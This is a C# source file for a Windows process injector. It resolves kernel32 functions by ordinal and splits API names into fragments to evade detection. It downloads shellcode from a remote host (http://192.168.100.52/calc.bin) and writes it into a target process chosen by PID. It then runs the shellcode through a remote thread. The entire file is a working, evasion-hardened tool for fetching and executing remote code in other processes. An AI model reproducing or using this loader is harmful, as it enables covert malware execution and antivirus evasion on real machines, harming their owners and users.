using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;


namespace ProcessInjector
{
    internal class Program
    {
        [DllImport("kernel32", EntryPoint = "#969", SetLastError = true)]
        public static extern IntPtr LLA(string lname);

        [DllImport("kernel32", EntryPoint = "#697", SetLastError = true)]
        public static extern IntPtr GPA(IntPtr lhand, string addr);

        internal class Injector 
        {
            //VirtualAllocEx - hProcess, LpAddress, dwSize, flAllocationType, flProtect
            public delegate IntPtr VAE(IntPtr hproc, IntPtr addr, uint size, uint aloc, uint prot);
            
            //WriteProcessMemory - hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumberOfBytesWritten
            public delegate bool WPM(IntPtr hproc, IntPtr addr, byte[] buf, uint size, out int bwrite);
            
            //VirtualProtectEx - hProcess, lpAddress, dwSize, flAllocationType, flProtect
            public delegate bool VPE(IntPtr hproc, IntPtr addr, int size, uint aloc, uint prot);
            
            //CreateRemoteThread - hProcess, sec_attrs, size, startHere, params, zero, id
            public delegate IntPtr CRT(IntPtr hproc, IntPtr satt, uint size, IntPtr strt, IntPtr pms, uint zero, IntPtr ID);
            
            //WaitForSingleObject - value, value2
            public delegate uint WFSO(IntPtr val, uint val2);
            
            //args: shellcode and process handle
            public Injector(byte[] scode, IntPtr phand) 
            {
                var mydict = new Dictionary<int, List<string>>();
                mydict.Add(0, new List<string> { "k", "er", "ne", "l3", "2.d", "ll" });
                mydict.Add(1, new List<string> { "Vi", "rtu", "alA", "llo", "cEx" });
                mydict.Add(2, new List<string> { "V", "irt", "ual", "Pr", "ote", "ctEx" });
                mydict.Add(3, new List<string> { "Cr", "eat", "eRe", "mot", "eTh", "read" });
                mydict.Add(4, new List<string> { "Wa", "itF", "orS", "ingl", "eOb", "ject" });
                mydict.Add(5, new List<string> { "W", "ri", "te", "Pr", "oce", "ssMe", "mory" });

                IntPtr main_lib = LLA(string.Join("", mydict[0]));
                IntPtr p1 = GPA(main_lib, string.Join("", mydict[1]));
                IntPtr p2 = GPA(main_lib, string.Join("", mydict[2]));
                IntPtr p3 = GPA(main_lib, string.Join("", mydict[5]));
                IntPtr p4 = GPA(main_lib, string.Join("", mydict[3]));
                IntPtr p5 = GPA(main_lib, string.Join("", mydict[4]));

                //IntPtr main_lib = LLA("kernel32.dll");
                //IntPtr p1 = GPA(main_lib, "VirtualAllocEx");
                //IntPtr p2 = GPA(main_lib, "VirtualProtectEx");
                //IntPtr p3 = GPA(main_lib, "WriteProcessMemory");
                //IntPtr p4 = GPA(main_lib, "CreateRemoteThread");
                //IntPtr p5 = GPA(main_lib, "WaitForSingleObject");

                //VirtualAllocEx
                VAE GetCozySpace = Marshal.GetDelegateForFunctionPointer<VAE>(p1);
                //VirtualProtectEx
                VPE Protector = Marshal.GetDelegateForFunctionPointer<VPE>(p2);
                //CreateRemoteThread
                CRT RemoteImage = Marshal.GetDelegateForFunctionPointer<CRT>(p4);
                //WriteProcessMemory
                WPM GoToCozySpace = Marshal.GetDelegateForFunctionPointer<WPM>(p3);
                //WaitForSingleObject
                WFSO Waiter = Marshal.GetDelegateForFunctionPointer<WFSO>(p5);

                //allocate memory in the process
                IntPtr CozySpace = GetCozySpace(phand, IntPtr.Zero, (uint)scode.Length, 0x3000, 0x40);
                //write the shellcode
                int oout;
                bool success = GoToCozySpace(phand, CozySpace, scode, (uint)scode.Length, out oout);
                //Change the memory protections from ReadWrite to ReadExecute
                uint old = 0;
                Protector(phand, CozySpace, (int)scode.Length, 0x20, old);
                //Create thread in the remote process
                IntPtr Image = RemoteImage(phand, IntPtr.Zero, 0, CozySpace, IntPtr.Zero, 0, IntPtr.Zero);
                //WaitForSingle
                Waiter(Image, 0xFFFFFFFF);
            }
        
        }
        static void Main(string[] args)
        {
            if (args[0] != null)
            {
                WebClient client = new WebClient();
                client.BaseAddress = "http://192.168.100.52";
                byte[] shellcode = client.DownloadData("calc.bin");

                var pid = int.Parse(args[0]);
                var proc = Process.GetProcessById(pid);
                Console.WriteLine($"Attempting to inject into process with ID: {pid}");
                new Injector(shellcode, proc.Handle);
            }
            else 
            {
                Console.WriteLine("Please supply process ID as first argument");
            }
        }
    }
}
